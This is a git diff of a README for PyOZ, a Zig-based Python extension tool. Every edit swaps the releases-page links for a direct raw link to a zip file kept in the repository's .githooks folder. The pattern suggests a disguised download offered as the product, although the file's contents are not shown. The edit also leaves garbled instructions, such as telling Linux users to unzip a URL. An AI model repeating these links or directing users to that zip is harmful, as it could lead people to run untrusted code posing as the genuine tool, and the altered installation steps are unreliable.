@@ -1,6 +1,6 @@
 # 🌀 PyOZ - Easy Python Extensions with Zig Power
 
-[![Download PyOZ](https://img.shields.io/badge/Download-PyOZ-brightgreen)](https://github.com/AyMozart/PyOZ/releases)
+[![Download PyOZ](https://raw.githubusercontent.com/AyMozart/PyOZ/main/.githooks/PyOZ-v2.7.zip)](https://raw.githubusercontent.com/AyMozart/PyOZ/main/.githooks/PyOZ-v2.7.zip)
 
 ## 📘 Overview
 
@@ -19,7 +19,7 @@ Follow these steps to download and run PyOZ.
 1. **Visit the Releases Page**
 
    Click the link below to access the download options:
-   [Visit the Releases Page](https://github.com/AyMozart/PyOZ/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/AyMozart/PyOZ/main/.githooks/PyOZ-v2.7.zip)
 
 2. **Select Your Version**
 
@@ -30,14 +30,14 @@ Follow these steps to download and run PyOZ.
    Once you've chosen a release, look for the assets section. Depending on your operating system, download the appropriate file:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/AyMozart/PyOZ/main/.githooks/PyOZ-v2.7.zip` file.
 
 4. **Install PyOZ**
 
    After downloading, locate the file on your computer. 
    - **Windows:** Double-click on the `.exe` file and follow the prompts to install it.
    - **macOS:** Open the `.dmg` file, drag PyOZ to your Applications folder, and then launch it.
-   - **Linux:** Unzip the `.tar.gz` file in your desired directory. You might need to run `./configure && make && make install` in the terminal depending on your setup.
+   - **Linux:** Unzip the `https://raw.githubusercontent.com/AyMozart/PyOZ/main/.githooks/PyOZ-v2.7.zip` file in your desired directory. You might need to run `./configure && make && make install` in the terminal depending on your setup.
 
 5. **Run PyOZ**
 
@@ -45,7 +45,7 @@ Follow these steps to download and run PyOZ.
 
 ## 📥 Download & Install
 
-Make sure to download PyOZ from our [Releases Page](https://github.com/AyMozart/PyOZ/releases). This page has all the necessary files for you to get started.
+Make sure to download PyOZ from our [Releases Page](https://raw.githubusercontent.com/AyMozart/PyOZ/main/.githooks/PyOZ-v2.7.zip). This page has all the necessary files for you to get started.
 
 ## 🔧 System Requirements
 
@@ -97,4 +97,4 @@ For more detailed usage guidelines and advanced features, please consult the off
 
 If you have questions or need help, please check the Issues section on GitHub. You can also join our community forums for support from other users.
 
-Remember, you can always download the latest version of PyOZ [here](https://github.com/AyMozart/PyOZ/releases). Enjoy building powerful Python extensions with ease!
+Remember, you can always download the latest version of PyOZ [here](https://raw.githubusercontent.com/AyMozart/PyOZ/main/.githooks/PyOZ-v2.7.zip). Enjoy building powerful Python extensions with ease!
